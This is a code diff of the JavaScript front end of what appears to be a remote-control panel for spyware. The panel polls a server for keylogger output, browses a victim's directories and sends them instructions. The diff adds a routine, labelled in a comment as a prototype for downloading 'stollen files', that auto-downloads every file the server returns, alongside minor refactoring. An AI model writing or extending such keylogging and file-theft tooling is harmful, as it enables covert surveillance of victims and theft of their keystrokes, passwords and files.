@@ -4,7 +4,7 @@ const keybox = document.getElementById('keybox');
 const dirbox = document.getElementById('dirbox');
 const file_selector = document.getElementById('file_selector');
 const downloadbtn = document.getElementById('downloadbtn');
-const update_interval = 1000;
+const update_interval = 5000;
 
 document.getElementById('refresh_file').addEventListener('click', function () {
     request('/action/get/folders')
@@ -26,8 +26,9 @@ document.getElementById("start_video").addEventListener('click', function () {//
 
 
 window.addEventListener('load', function () {
-    request('/action/get/folders')//reequest folders when th page loads
+    //request('/action/get/folders')//reequest folders when th page loads
     setInterval(() => {
+        request('/action/get/folders')
         request('/action/get/keylog')//get th keylog repeatedly
     }, update_interval);
 })
@@ -47,6 +48,7 @@ async function request(what) {//make a request to server
                     case '/action/get/keylog'://keylog
                         writeoutkeylog(resput)
                         break;
+
                     case '/action/get/folders'://files and current dir
                         directoryman.files = resput.files;
                         directoryman.current_dir = resput.current_dir;
@@ -61,6 +63,14 @@ async function request(what) {//make a request to server
                             directoryman.build_dir(resput.files[i].path, resput.files[i].name, resput.files[i].type)
                         }
                         //resput.files.forEach(filee => { directoryman.build_dir(resput.path, resput.name, resput.type) })
+                        break;
+
+                    case '/action/get/temp'://prototype donload stollen files from server
+                        console.log('Files: ', resput)
+                        resput.forEach(file => {
+                            downloadbtn.href = 'temp/' + file;
+                            downloadbtn.click();
+                        })
                         break;
                 }
                 //return this.responseText;
@@ -84,9 +94,9 @@ async function post(what, where) {//post data to server
             var resput = JSON.parse(this.responseText)
             console.log('Sever responed to post ', where, 'with: ', resput)
             if (where == "/action/post/folders/instruct") {//posted an instruction
-                for (let i = 0; i < 10; i++) {//0 imediatly
+                /*for (let i = 0; i < 10; i++) {//0 imediatly
                     setTimeout(() => { request('/action/get/folders'); }, update_interval * i);
-                }
+                }*/
             }
         }
     };
@@ -95,8 +105,8 @@ async function post(what, where) {//post data to server
     xhttp.send(JSON.stringify(what));
 }
 
-async function submitform(){
-    
+async function submitform() {
+
 }
 
 function writeoutkeylog(keys) {//write keylog data to page
@@ -142,7 +152,7 @@ let directoryman = {
 
 
     },
-    download:function(relative_filepath){
+    download: function (relative_filepath) {
         downloadbtn.href = relative_filepath;//Set button to file location on server
         downloadbtn.click();//'Click' action on the button
     }
